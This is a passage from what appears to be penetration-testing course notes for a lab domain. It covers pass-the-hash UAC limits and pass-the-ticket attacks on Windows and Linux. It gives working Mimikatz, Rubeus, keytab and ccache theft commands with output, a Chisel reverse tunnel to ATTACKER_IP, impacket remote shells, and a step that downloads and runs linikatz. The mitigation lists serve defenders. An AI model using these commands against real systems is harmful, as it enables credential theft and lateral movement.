<h2 id="uac-limitations-for-local-accounts"><a class="header" href="#uac-limitations-for-local-accounts">UAC Limitations for Local Accounts</a></h2>
<p>UAC (User Account Control) limits local users‚Äô ability to perform remote administration operations.</p>
<h3 id="localaccounttokenfilterpolicy"><a class="header" href="#localaccounttokenfilterpolicy">LocalAccountTokenFilterPolicy</a></h3>
<p>When <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> is set to:</p>
<ul>
<li><strong>0</strong> - Only the built-in local admin account (RID-500, ‚ÄúAdministrator‚Äù) can perform remote administration tasks</li>
<li><strong>1</strong> - Other local admins are also allowed</li>
</ul>
<h3 id="filteradministratortoken"><a class="header" href="#filteradministratortoken">FilterAdministratorToken</a></h3>
<p>If the registry key <code>FilterAdministratorToken</code> (disabled by default) is enabled (value 1), the RID 500 account is enrolled in UAC protection. This means remote PtH will fail against the machine when using that account.</p>
<p><strong>Important:</strong> These settings only apply to local administrative accounts. Domain accounts with administrative rights on a computer can still use Pass the Hash.</p>
<hr>
<h2 id="mitigations-1"><a class="header" href="#mitigations-1">Mitigations</a></h2>
<ul>
<li>Limit use of local administrator accounts</li>
<li>Use unique passwords for local administrator accounts across machines</li>
<li>Enable Protected Users group membership for sensitive accounts</li>
<li>Implement Credential Guard</li>
<li>Monitor for PtH indicators (e.g., NTLM authentication events, unusual logon patterns)</li>
<li>Regularly rotate privileged account passwords</li>
</ul>
<h2 id="references-4"><a class="header" href="#references-4">References</a></h2>
<ul>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Documentation</a></li>
<li><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a></li>
<li><a href="https://www.netexec.wiki/">NetExec Wiki</a></li>
<li><a href="https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="pass-the-ticket-ptt-attacks"><a class="header" href="#pass-the-ticket-ptt-attacks">Pass the Ticket (PtT) Attacks</a></h1>
<p>A Pass the Ticket (PtT) attack uses a stolen Kerberos ticket to move laterally in an Active Directory environment instead of an NTLM password hash. This technique leverages the Kerberos authentication protocol to access resources without needing the user‚Äôs plaintext password.</p>
<h2 id="kerberos-protocol-overview"><a class="header" href="#kerberos-protocol-overview">Kerberos Protocol Overview</a></h2>
<p>The Kerberos authentication system is ticket-based. Instead of giving an account password to every service, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service.</p>
<h3 id="key-components"><a class="header" href="#key-components">Key Components</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Component</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>TGT</strong> (Ticket Granting Ticket)</td><td>First ticket obtained on a Kerberos system. Permits the client to obtain additional Kerberos tickets (TGS).</td></tr>
<tr><td><strong>TGS</strong> (Ticket Granting Service)</td><td>Requested by users who want to use a service. Allows services to verify the user‚Äôs identity.</td></tr>
<tr><td><strong>KDC</strong> (Key Distribution Center)</td><td>Issues tickets to clients. Usually runs on the Domain Controller.</td></tr>
</tbody>
</table>
</div>
<h3 id="authentication-flow"><a class="header" href="#authentication-flow">Authentication Flow</a></h3>
<ol>
<li>User requests a TGT by authenticating to the DC (encrypting current timestamp with their password hash)</li>
<li>DC validates the user‚Äôs identity by decrypting the timestamp (DC knows the user‚Äôs password hash)</li>
<li>DC sends the user a TGT for future requests</li>
<li>User presents TGT to request TGS for specific services</li>
<li>User presents TGS to the target service for authentication</li>
</ol>
<p>Once the user has their TGT, they do not have to prove who they are with their password again.</p>
<hr>
<h2 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h2>
<p>To perform a Pass the Ticket attack, you need a valid Kerberos ticket:</p>
<ul>
<li><strong>Service Ticket (TGS)</strong> - Allows access to a particular resource</li>
<li><strong>Ticket Granting Ticket (TGT)</strong> - Can be used to request service tickets for any resource the user has privileges to access</li>
</ul>
<p>Tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. As a non-administrative user, you can only get your own tickets. As a local administrator, you can collect all tickets on the system.</p>
<hr>
<h2 id="harvesting-kerberos-tickets"><a class="header" href="#harvesting-kerberos-tickets">Harvesting Kerberos Tickets</a></h2>
<h3 id="using-mimikatz-1"><a class="header" href="#using-mimikatz-1">Using Mimikatz</a></h3>
<p>Export all tickets from the system:</p>
<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 329278 (00000000:0005063e)
Session           : Network from 0
User Name         : DC01$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 7/12/2022 9:39:55 AM
SID               : S-1-5-18

         * Username : DC01$
         * Domain   : inlanefreight.htb
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
           Target Name  (--) : @ inlanefreight.htb
           Client Name  (01) : DC01$ ; @ inlanefreight.htb
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 2 - Ticket Granting Ticket
</code></pre>
<p>The result is a list of <code>.kirbi</code> files containing the tickets.</p>
<p><strong>Ticket Naming Convention:</strong></p>
<ul>
<li>Tickets ending with <code>$</code> correspond to computer accounts</li>
<li>User tickets: <code>[randomvalue]-username@service-domain.local.kirbi</code></li>
<li>Tickets with service <code>krbtgt</code> correspond to the TGT for that account</li>
</ul>
<h3 id="using-rubeus"><a class="header" href="#using-rubeus">Using Rubeus</a></h3>
<p>Export tickets in Base64 format (use <code>/nowrap</code> for easier copy-paste):</p>
<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe dump /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x6c680
    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  DC01$
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:39:54 AM
    EndTime               :  7/12/2022 7:39:54 PM
    RenewTill             :  7/19/2022 9:39:54 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
    Base64EncodedTicket   :  doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lh...
</code></pre>
<p><strong>Note:</strong> Mimikatz version 2.2.0 20220919 may show all hashes as <code>des_cbc_md4</code> on some Windows 10 versions. Exported tickets may not work correctly. Use Rubeus as an alternative.</p>
<hr>
<h2 id="pass-the-key--overpass-the-hash-1"><a class="header" href="#pass-the-key--overpass-the-hash-1">Pass the Key / OverPass the Hash</a></h2>
<p>This technique converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full TGT.</p>
<h3 id="extract-kerberos-keys-with-mimikatz"><a class="header" href="#extract-kerberos-keys-with-mimikatz">Extract Kerberos Keys with Mimikatz</a></h3>
<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
</code></pre>
<h3 id="mimikatz---pass-the-key"><a class="header" href="#mimikatz---pass-the-key">Mimikatz - Pass the Key</a></h3>
<p>Using NTLM hash (RC4):</p>
<pre><code class="language-cmd">mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
  |  PID  1128
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 3414364 (00000000:0034195c)
  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
  \_ kerberos - data copy @ 000001C7E20EE578
   \_ rc4_hmac_nt       OK
   \_ *Password replace @ 000001C7E2136BC8 (32) -&gt; null
</code></pre>
<p>This spawns a new cmd.exe window in the context of the target user.</p>
<h3 id="rubeus---pass-the-key-asktgt"><a class="header" href="#rubeus---pass-the-key-asktgt">Rubeus - Pass the Key (asktgt)</a></h3>
<p>Using AES-256 hash:</p>
<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] Base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC...

[+] Ticket successfully imported!
</code></pre>
<hr>
<h2 id="pass-the-ticket-1"><a class="header" href="#pass-the-ticket-1">Pass the Ticket</a></h2>
<h3 id="rubeus---import-kirbi-file"><a class="header" href="#rubeus---import-kirbi-file">Rubeus - Import .kirbi File</a></h3>
<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools&gt; dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)
...
</code></pre>
<h3 id="rubeus---import-base64-ticket"><a class="header" href="#rubeus---import-base64-ticket">Rubeus - Import Base64 Ticket</a></h3>
<p>Convert .kirbi to Base64:</p>
<pre><code class="language-powershell">PS c:\tools&gt; [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQ...
</code></pre>
<p>Import Base64 ticket:</p>
<pre><code class="language-cmd">c:\tools&gt; Rubeus.exe ptt /ticket:doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQ...

[+] Ticket successfully imported!
</code></pre>
<h3 id="mimikatz---pass-the-ticket"><a class="header" href="#mimikatz---pass-the-ticket">Mimikatz - Pass the Ticket</a></h3>
<pre><code class="language-cmd">mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools&gt; powershell
PS C:\tools&gt; Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents&gt; whoami
inlanefreight\john
</code></pre>
<hr>
<h2 id="rubeus---sacrificial-process-for-lateral-movement"><a class="header" href="#rubeus---sacrificial-process-for-lateral-movement">Rubeus - Sacrificial Process for Lateral Movement</a></h2>
<p>Using <code>createnetonly</code> creates a sacrificial process/logon session (Logon type 9), equivalent to <code>runas /netonly</code>. This prevents erasure of existing TGTs for the current logon session.</p>
<h3 id="create-sacrificial-process"><a class="header" href="#create-sacrificial-process">Create Sacrificial Process</a></h3>
<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

[*] Action: Create process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
</code></pre>
<h3 id="request-tgt-and-import-in-sacrificial-process"><a class="header" href="#request-tgt-and-import-in-sacrificial-process">Request TGT and Import in Sacrificial Process</a></h3>
<p>From the new cmd window:</p>
<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

[+] TGT request successful!
[+] Ticket successfully imported!

C:\tools&gt; powershell
PS C:\tools&gt; Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents&gt; whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents&gt; hostname
DC01
</code></pre>
<hr>
<h2 id="summary-of-key-commands"><a class="header" href="#summary-of-key-commands">Summary of Key Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td>Mimikatz</td><td><code>sekurlsa::tickets /export</code></td><td>Export all tickets to .kirbi files</td></tr>
<tr><td>Mimikatz</td><td><code>sekurlsa::ekeys</code></td><td>Extract Kerberos encryption keys</td></tr>
<tr><td>Mimikatz</td><td><code>kerberos::ptt &lt;file.kirbi&gt;</code></td><td>Import ticket into current session</td></tr>
<tr><td>Rubeus</td><td><code>dump /nowrap</code></td><td>Dump all tickets in Base64</td></tr>
<tr><td>Rubeus</td><td><code>asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;hash&gt; /ptt</code></td><td>Request TGT with hash and import</td></tr>
<tr><td>Rubeus</td><td><code>ptt /ticket:&lt;file or base64&gt;</code></td><td>Import ticket into current session</td></tr>
<tr><td>Rubeus</td><td><code>createnetonly /program:cmd.exe /show</code></td><td>Create sacrificial logon session</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="pass-the-ticket-from-linux"><a class="header" href="#pass-the-ticket-from-linux">Pass the Ticket from Linux</a></h2>
<p>Linux computers connected to Active Directory commonly use Kerberos for authentication. If you compromise a Linux machine connected to AD, you can find Kerberos tickets to impersonate other users.</p>
<p><strong>Note:</strong> A Linux machine doesn‚Äôt need to be domain-joined to use Kerberos tickets. Scripts and applications can use Kerberos to authenticate to the network.</p>
<h3 id="kerberos-ticket-storage-on-linux"><a class="header" href="#kerberos-ticket-storage-on-linux">Kerberos Ticket Storage on Linux</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Storage Type</th><th>Location</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>ccache files</strong></td><td><code>/tmp/krb5cc_*</code></td><td>Default ticket cache files, location stored in <code>KRB5CCNAME</code> environment variable</td></tr>
<tr><td><strong>Keytab files</strong></td><td><code>/etc/krb5.keytab</code> or custom</td><td>Contains Kerberos principals and encrypted keys for passwordless authentication</td></tr>
<tr><td><strong>SSSD cache</strong></td><td><code>/var/lib/sss/db/</code></td><td>Used by SSSD for caching credentials</td></tr>
</tbody>
</table>
</div>
<h3 id="identifying-ad-integration"><a class="header" href="#identifying-ad-integration">Identifying AD Integration</a></h3>
<p>Check if the Linux machine is domain-joined:</p>
<pre><code class="language-bash"># Using realm
david@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  login-formats: %U@inlanefreight.htb
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
</code></pre>
<p>Check for SSSD or Winbind services:</p>
<pre><code class="language-bash">david@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root  2140  1  0 Sep29 ?  00:00:01 /usr/sbin/sssd -i --logger=files
root  2141  2140  0 Sep29 ?  00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root  2142  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root  2143  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
</code></pre>
<hr>
<h3 id="finding-keytab-files"><a class="header" href="#finding-keytab-files">Finding Keytab Files</a></h3>
<p>Search for keytab files:</p>
<pre><code class="language-bash">david@linux01:~$ find / -name *keytab* -ls 2&gt;/dev/null

131610  4 -rw-------  1 root  root  1348 Oct  4 16:26 /etc/krb5.keytab
262169  4 -rw-rw-rw-  1 root  root   216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
</code></pre>
<p>Check for keytab references in cron jobs:</p>
<pre><code class="language-bash">david@linux01:~$ crontab -l

# Ticket renewal
kinit -k -t /home/carlos@inlanefreight.htb/.scripts/kerberos/.]carlos.keytab carlos@inlanefreight.htb
</code></pre>
<h3 id="listing-keytab-file-principals"><a class="header" href="#listing-keytab-file-principals">Listing Keytab File Principals</a></h3>
<pre><code class="language-bash">david@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
</code></pre>
<h3 id="impersonating-a-user-with-keytab"><a class="header" href="#impersonating-a-user-with-keytab">Impersonating a User with Keytab</a></h3>
<pre><code class="language-bash"># Check current ticket
david@linux01:~$ klist

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

# Import keytab (kinit is case-sensitive!)
david@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Verify new ticket
david@linux01:~$ klist

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
</code></pre>
<p>Access resources as the impersonated user:</p>
<pre><code class="language-bash">david@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
</code></pre>
<p><strong>Tip:</strong> Save your current ccache file before importing a keytab:</p>
<pre><code class="language-bash">cp $KRB5CCNAME /tmp/krb5cc_backup
</code></pre>
<hr>
<h3 id="extracting-hashes-from-keytab-files"><a class="header" href="#extracting-hashes-from-keytab-files">Extracting Hashes from Keytab Files</a></h3>
<p>Use KeyTabExtract to extract hashes for offline cracking:</p>
<pre><code class="language-bash">david@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
</code></pre>
<p>With these hashes you can:</p>
<ul>
<li>Perform Pass the Hash with the NTLM hash</li>
<li>Forge tickets using AES256/AES128 with Rubeus</li>
<li>Attempt to crack the hashes offline</li>
</ul>
<p><strong>Note:</strong> A keytab file can contain multiple credentials from different users.</p>
<hr>
<h3 id="finding-ccache-files"><a class="header" href="#finding-ccache-files">Finding ccache Files</a></h3>
<p>ccache files are stored in <code>/tmp</code> by default:</p>
<pre><code class="language-bash">david@linux01:~$ ls -la /tmp/krb5cc_*

-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
</code></pre>
<p>Check the environment variable for custom locations:</p>
<pre><code class="language-bash">david@linux01:~$ echo $KRB5CCNAME
</code></pre>
<h3 id="using-ccache-files"><a class="header" href="#using-ccache-files">Using ccache Files</a></h3>
<p>Set the <code>KRB5CCNAME</code> variable to use a specific ccache file:</p>
<pre><code class="language-bash"># As root, use another user's ccache
root@linux01:~# export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133

root@linux01:~# klist

Ticket cache: FILE:/tmp/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

# Access resources
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass

  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022
</code></pre>
<p><strong>Note:</strong> ccache files are temporary and may expire or change during login/logout operations. Check ‚ÄúValid starting‚Äù and ‚ÄúExpires‚Äù times with <code>klist</code>.</p>
<hr>
<h3 id="using-linux-attack-tools-with-kerberos"><a class="header" href="#using-linux-attack-tools-with-kerberos">Using Linux Attack Tools with Kerberos</a></h3>
<p>Many Linux tools support Kerberos authentication. Set <code>KRB5CCNAME</code> to point to your ccache file.</p>
<h4 id="prerequisites-for-non-domain-joined-attack-hosts"><a class="header" href="#prerequisites-for-non-domain-joined-attack-hosts">Prerequisites for Non-Domain-Joined Attack Hosts</a></h4>
<ol>
<li>Configure <code>/etc/hosts</code> to resolve domain names:</li>
</ol>
<pre><code class="language-bash">$ cat /etc/hosts

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
</code></pre>
<ol start="2">
<li>Set up a SOCKS proxy (e.g., with Chisel) if needed:</li>
</ol>
<pre><code class="language-bash"># On attack host
$ sudo ./chisel server --reverse

# On pivot host (MS01)
C:\&gt; chisel.exe client ATTACKER_IP:8080 R:socks
</code></pre>
<ol start="3">
<li>Configure proxychains:</li>
</ol>
<pre><code class="language-bash">$ cat /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
</code></pre>
<h4 id="using-impacket-with-kerberos"><a class="header" href="#using-impacket-with-kerberos">Using Impacket with Kerberos</a></h4>
<pre><code class="language-bash"># Set the ccache file
$ export KRB5CCNAME=/root/krb5cc_647401106_I8I133

# Use impacket tools with -k flag
$ proxychains impacket-wmiexec dc01 -k

[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01:445 ... OK
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;whoami
inlanefreight\julio
</code></pre>
<h4 id="using-evil-winrm-with-kerberos"><a class="header" href="#using-evil-winrm-with-kerberos">Using Evil-WinRM with Kerberos</a></h4>
<pre><code class="language-bash">$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01:5985 ... OK
*Evil-WinRM* PS C:\Users\julio\Documents&gt; whoami ; hostname
inlanefreight\julio
DC01
</code></pre>
<hr>
<h3 id="converting-tickets-between-formats"><a class="header" href="#converting-tickets-between-formats">Converting Tickets Between Formats</a></h3>
<p>Use <code>impacket-ticketConverter</code> to convert between ccache (Linux) and kirbi (Windows) formats:</p>
<h4 id="ccache-to-kirbi"><a class="header" href="#ccache-to-kirbi">ccache to kirbi</a></h4>
<pre><code class="language-bash">$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
</code></pre>
<h4 id="import-kirbi-in-windows"><a class="header" href="#import-kirbi-in-windows">Import kirbi in Windows</a></h4>
<pre><code class="language-cmd">C:\tools&gt; Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\tools&gt; klist

Cached Tickets: (1)

#0&gt;     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)

C:\tools&gt; dir \\dc01\julio
 Directory of \\dc01\julio

07/14/2022  04:18 PM                17 julio.txt
</code></pre>
<hr>
<h3 id="linikatz"><a class="header" href="#linikatz">Linikatz</a></h3>
<p>Linikatz is a tool for extracting credentials from Linux machines integrated with Active Directory (similar to Mimikatz for Windows).</p>
<p><strong>Requirements:</strong> Must run as root.</p>
<p><strong>Supported integrations:</strong> FreeIPA, SSSD, Samba, Vintella, and more.</p>
<pre><code class="language-bash">$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ chmod +x linikatz.sh
$ sudo ./linikatz.sh

 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   &lt; (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [sss-check] SSS AD configuration
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB
...
</code></pre>
<p>Linikatz extracts credentials and places them in a folder named <code>linikatz.*</code> containing ccache and keytab files.</p>
<hr>
<h3 id="linux-ptt-command-summary"><a class="header" href="#linux-ptt-command-summary">Linux PtT Command Summary</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>realm list</code></td><td>Check if machine is domain-joined</td></tr>
<tr><td><code>find / -name *keytab* -ls 2&gt;/dev/null</code></td><td>Find keytab files</td></tr>
<tr><td><code>klist -k -t &lt;keytab&gt;</code></td><td>List principals in keytab</td></tr>
<tr><td><code>kinit &lt;user&gt; -k -t &lt;keytab&gt;</code></td><td>Import keytab and get TGT</td></tr>
<tr><td><code>klist</code></td><td>List current Kerberos tickets</td></tr>
<tr><td><code>export KRB5CCNAME=&lt;ccache&gt;</code></td><td>Set ccache file to use</td></tr>
<tr><td><code>smbclient //&lt;host&gt;/&lt;share&gt; -k</code></td><td>Access SMB with Kerberos</td></tr>
<tr><td><code>impacket-ticketConverter &lt;in&gt; &lt;out&gt;</code></td><td>Convert ccache/kirbi formats</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="mitigations-2"><a class="header" href="#mitigations-2">Mitigations</a></h2>
<ul>
<li>Enable Credential Guard to protect LSASS</li>
<li>Use Protected Users security group for sensitive accounts</li>
<li>Implement Privileged Access Workstations (PAWs)</li>
<li>Monitor for suspicious Kerberos activity (Event IDs 4768, 4769)</li>
<li>Regularly rotate service account passwords</li>
<li>Limit the lifetime of Kerberos tickets via Group Policy</li>
<li>Restrict permissions on keytab and ccache files on Linux systems</li>
<li>Use short-lived tickets and enforce ticket renewal</li>
</ul>
<hr>
<h2 id="references-5"><a class="header" href="#references-5">References</a></h2>
<ul>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz Documentation</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
<li><a href="https://www.slideshare.net/gentaboron/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it">Abusing Microsoft Kerberos - Benjamin Delpy &amp; Skip Duckwall</a></li>
<li><a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a></li>
